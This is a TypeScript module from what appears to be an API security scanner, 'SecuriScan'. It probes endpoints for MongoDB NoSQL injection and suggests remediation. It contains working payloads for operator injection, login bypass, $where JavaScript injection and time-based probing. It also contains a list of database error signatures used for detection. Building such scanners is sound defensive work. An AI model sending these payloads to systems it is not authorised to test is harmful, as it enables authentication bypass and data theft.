import { AxiosResponse } from "axios";
import { scannerClient } from "@/server/core/http/scanner-client";
import { SecurityCheck, ScanTarget, FindingResult, Evidence } from "@/types";
import { logger } from "@/server/core/logging/logger";

const log = logger.child("nosqli-check");

/* ─── NoSQL Injection Payloads ─── */
const NOSQL_PAYLOADS: { payload: Record<string, unknown> | string; label: string; technique: string }[] = [
    // MongoDB operator injection
    { payload: { "$gt": "" }, label: "MongoDB $gt operator bypass", technique: "operator-injection" },
    { payload: { "$ne": null }, label: "MongoDB $ne null bypass", technique: "operator-injection" },
    { payload: { "$ne": "" }, label: "MongoDB $ne empty string bypass", technique: "operator-injection" },
    { payload: { "$regex": ".*" }, label: "MongoDB $regex wildcard", technique: "operator-injection" },
    { payload: { "$exists": true }, label: "MongoDB $exists operator", technique: "operator-injection" },
    { payload: { "$in": [true, 1, "admin"] }, label: "MongoDB $in array bypass", technique: "operator-injection" },
    { payload: { "$where": "return true" }, label: "MongoDB $where JavaScript injection", technique: "js-injection" },
    { payload: { "$where": "sleep(3000)" }, label: "MongoDB $where time-based", technique: "time-based" },

    // Authentication bypass patterns
    { payload: { "username": { "$gt": "" }, "password": { "$gt": "" } }, label: "Auth bypass via $gt operators", technique: "auth-bypass" },
    { payload: { "username": { "$ne": "invalid" }, "password": { "$ne": "invalid" } }, label: "Auth bypass via $ne operators", technique: "auth-bypass" },
    { payload: { "username": "admin", "password": { "$regex": ".*" } }, label: "Admin auth bypass via regex", technique: "auth-bypass" },
    { payload: { "username": { "$regex": "^admin" }, "password": { "$gt": "" } }, label: "Regex admin user enumeration", technique: "auth-bypass" },

    // String-based injection (for URL parameters)
    { payload: "' || '1'=='1", label: "String-based NoSQL OR bypass", technique: "string-injection" },
    { payload: ";return true;var x='", label: "JavaScript code injection", technique: "js-injection" },
    { payload: "'; return '' == '", label: "MongoDB JS eval bypass", technique: "js-injection" },
    { payload: "this.password.match(/.*/)", label: "MongoDB regex match via JS", technique: "js-injection" },
];

/* ─── NoSQL Error Signatures ─── */
const NOSQL_ERROR_SIGNATURES = [
    "mongos", "mongodb", "MongoError", "mongoose",
    "bson", "ObjectId", "BSONTypeError", "CastError",
    "$where", "$gt", "$ne", "$regex", "operator",
    "Cannot apply $", "unknown operator", "bad query",
    "invalid operator", "SyntaxError", "ReferenceError",
    "MongoServerError", "E11000", "WriteError",
    "projection", "aggregation", "invalid $",
];

export class NoSqlInjectionCheck implements SecurityCheck {
    name = "NoSQL Injection Check";
    description = "Tests for NoSQL injection via MongoDB operator injection, JavaScript code injection, authentication bypass, and $where-based attacks";
    owaspMapping = "Injection";
    owaspId = "API8:2023";

    async run(target: ScanTarget): Promise<FindingResult[]> {
        const findings: FindingResult[] = [];
        const foundEndpoints = new Set<string>();

        for (const endpoint of target.endpoints) {
            const url = `${target.baseUrl}${endpoint.path}`;
            const endpointKey = `${endpoint.method}:${endpoint.path}`;
            if (foundEndpoints.has(endpointKey)) continue;

            const method = endpoint.method.toLowerCase();

            /* ── Get baseline response ── */
            let baselineBody = "";
            let baselineStatus = 0;
            let baselineTime = 0;
            try {
                const headers: Record<string, string> = { "User-Agent": "SecuriScan/1.0", "Content-Type": "application/json", ...(endpoint.customHeaders || {}) };
                if (target.authConfig?.value) {
                    headers["Authorization"] = target.authConfig.type === "api_key" ? target.authConfig.value : `Bearer ${target.authConfig.value}`;
                }
                const start = Date.now();
                const baseResp = await scannerClient({
                    requestsPerSecond: target.requestsPerSecond,
                    method,
                    url,
                    timeout: 15000,
                    validateStatus: () => true,
                    headers,
                });
                baselineTime = Date.now() - start;
                baselineStatus = baseResp.status;
                baselineBody = typeof baseResp.data === "string" ? baseResp.data : JSON.stringify(baseResp.data || "");
            } catch {
                continue;
            }

            /* ── Test body-based injection (POST/PUT/PATCH) ── */
            if (["post", "put", "patch"].includes(method)) {
                for (const { payload, label, technique } of NOSQL_PAYLOADS) {
                    if (foundEndpoints.has(endpointKey)) break;
                    if (typeof payload === "string") continue; // Skip string payloads for body

                    try {
                        const headers: Record<string, string> = { "User-Agent": "SecuriScan/1.0", "Content-Type": "application/json", ...(endpoint.customHeaders || {}) };
                        if (target.authConfig?.value) {
                            headers["Authorization"] = target.authConfig.type === "api_key" ? target.authConfig.value : `Bearer ${target.authConfig.value}`;
                        }

                        let body: unknown;
                        if (endpoint.requestBody) {
                            try {
                                const parsed = JSON.parse(endpoint.requestBody);
                                // Inject operator into each field
                                body = Object.fromEntries(
                                    Object.entries(parsed).map(([k]) => [k, payload])
                                );
                            } catch {
                                body = payload;
                            }
                        } else {
                            body = payload;
                        }

                        const start = Date.now();
                        const response = await scannerClient({
                            requestsPerSecond: target.requestsPerSecond,
                            method,
                            url,
                            timeout: technique === "time-based" ? 15000 : 10000,
                            validateStatus: () => true,
                            headers,
                            data: body,
                        });
                        const elapsed = Date.now() - start;
                        const responseBody = typeof response.data === "string" ? response.data : JSON.stringify(response.data || "");

                        const result = this.analyzeResponse(response, responseBody, baselineBody, baselineStatus, baselineTime, elapsed, technique, label, payload, endpoint, url, headers);
                        if (result) {
                            foundEndpoints.add(endpointKey);
                            findings.push(result);
                        }
                    } catch (err) {
                        log.debug(`NoSQLi body test skipped: ${err instanceof Error ? err.message : String(err)}`);
                    }
                }
            }

            /* ── Test query parameter-based injection ── */
            for (const { payload, label, technique } of NOSQL_PAYLOADS) {
                if (foundEndpoints.has(endpointKey)) break;

                try {
                    const headers: Record<string, string> = { "User-Agent": "SecuriScan/1.0", ...(endpoint.customHeaders || {}) };
                    if (target.authConfig?.value) {
                        headers["Authorization"] = target.authConfig.type === "api_key" ? target.authConfig.value : `Bearer ${target.authConfig.value}`;
                    }

                    let testUrl: string;
                    if (typeof payload === "string") {
                        const paramName = endpoint.parameters?.find(p => p.in === "query")?.name || "id";
                        const sep = url.includes("?") ? "&" : "?";
                        testUrl = `${url}${sep}${paramName}=${encodeURIComponent(payload)}`;
                    } else {
                        // Inject MongoDB operators via query params e.g. ?username[$ne]=&password[$ne]=
                        const queryParts: string[] = [];
                        for (const [key, val] of Object.entries(payload)) {
                            if (typeof val === "object" && val !== null) {
                                // eslint-disable-next-line @typescript-eslint/no-explicit-any
                                for (const [op, opVal] of Object.entries(val as any)) {
                                    queryParts.push(`${key}[${op}]=${encodeURIComponent(String(opVal))}`);
                                }
                            } else {
                                queryParts.push(`${key}=${encodeURIComponent(String(val))}`);
                            }
                        }
                        const sep = url.includes("?") ? "&" : "?";
                        testUrl = `${url}${sep}${queryParts.join("&")}`;
                    }

                    const start = Date.now();
                    const response = await scannerClient({
                        requestsPerSecond: target.requestsPerSecond,
                        method: "get",
                        url: testUrl,
                        timeout: technique === "time-based" ? 15000 : 10000,
                        validateStatus: () => true,
                        headers,
                    });
                    const elapsed = Date.now() - start;
                    const responseBody = typeof response.data === "string" ? response.data : JSON.stringify(response.data || "");

                    const result = this.analyzeResponse(response, responseBody, baselineBody, baselineStatus, baselineTime, elapsed, technique, label, payload, endpoint, testUrl, headers);
                    if (result) {
                        foundEndpoints.add(endpointKey);
                        findings.push(result);
                    }
                } catch (err) {
                    log.debug(`NoSQLi param test skipped: ${err instanceof Error ? err.message : String(err)}`);
                }
            }
        }

        return findings;
    }

    private analyzeResponse(
        response: AxiosResponse, responseBody: string, baselineBody: string, baselineStatus: number,
        baselineTime: number, elapsed: number, technique: string, label: string,
        payload: Record<string, unknown> | string, endpoint: { path: string; method: string },
        url: string, headers: Record<string, string>
    ): FindingResult | null {
        let isVulnerable = false;
        let evidenceDesc = "";
        const lowerBody = responseBody.toLowerCase();

        // Time-based detection
        if (technique === "time-based" && elapsed > baselineTime + 2500) {
            isVulnerable = true;
            evidenceDesc = `Time-based NoSQL injection detected. Baseline: ${baselineTime}ms, Injected: ${elapsed}ms. The $where sleep() payload delayed the response.`;
        }

        // Error disclosure
        const sigMatches = NOSQL_ERROR_SIGNATURES.filter(sig => lowerBody.includes(sig.toLowerCase()));
        if (sigMatches.length > 0 && response.status >= 400) {
            isVulnerable = true;
            evidenceDesc = `NoSQL error signatures leaked: ${sigMatches.join(", ")}. The application exposes database internals when processing operator payloads.`;
        }

        // Auth bypass detection (200 response when injecting operators in login)
        if (technique === "auth-bypass" && response.status >= 200 && response.status < 300) {
            const body = lowerBody;
            if (body.includes("token") || body.includes("session") || body.includes("user") || body.includes("auth") || body.includes("success")) {
                isVulnerable = true;
                evidenceDesc = `Authentication bypass via NoSQL operator injection detected! The login endpoint returned a success response (HTTP ${response.status}) with authentication tokens/session data when MongoDB operators were injected instead of credentials.`;
            }
        }

        // Operator injection detection — unexpected data returned
        if (technique === "operator-injection" && response.status >= 200 && response.status < 300 && responseBody.length > baselineBody.length + 100) {
            isVulnerable = true;
            evidenceDesc = `NoSQL operator injection detected. The injected operator payload caused the response to return ${responseBody.length} bytes vs baseline ${baselineBody.length} bytes, suggesting the database query was manipulated.`;
        }

        if (!isVulnerable) return null;

        return {
            checkType: "nosql-injection",
            severity: technique === "auth-bypass" || technique === "js-injection" ? "CRITICAL" : "HIGH",
            title: `NoSQL Injection (${label}): ${endpoint.method} ${endpoint.path}`,
            description: `${evidenceDesc}\n\nPayload: ${JSON.stringify(payload)}\nTechnique: ${technique}`,
            evidence: this.buildEvidence(url, endpoint.method, headers, response, JSON.stringify(payload)),
            owaspMapping: this.owaspMapping,
            owaspId: this.owaspId,
            remediation: `Sanitize all user input before using in NoSQL queries:\n\n\`\`\`javascript\n//  VULNERABLE — Directly passing user input\nconst user = await User.findOne({ username: req.body.username, password: req.body.password });\n\n//  SECURE — Explicit type casting and mongo-sanitize\nimport mongoSanitize from 'express-mongo-sanitize';\napp.use(mongoSanitize()); // Strips $ and . from req.body/params/query\n\nconst user = await User.findOne({\n  username: String(req.body.username),\n  password: String(req.body.password)\n});\n\n//  SECURE — Schema validation with Zod/Joi\nconst loginSchema = z.object({\n  username: z.string().min(1).max(100),\n  password: z.string().min(8),\n});\nconst { username, password } = loginSchema.parse(req.body);\n\`\`\`\n\nAdditional protections:\n- Use express-mongo-sanitize middleware\n- Always cast inputs to expected types (String, Number)\n- Validate input schemas with Zod, Joi, or Yup\n- Disable server-side JavaScript execution in MongoDB config`,
            endpoint: endpoint.path,
            method: endpoint.method,
        };
    }

    private buildEvidence(url: string, method: string, headers: Record<string, string>, response: AxiosResponse, payload: string): Evidence {
        return {
            request: { url, method, headers },
            response: {
                status: response.status,
                headers: response.headers as Record<string, string>,
                body: typeof response.data === "object" ? response.data : String(response.data).slice(0, 500),
            },
            description: `NoSQLi probe sent to ${method} ${url}`,
            payload,
        };
    }
}
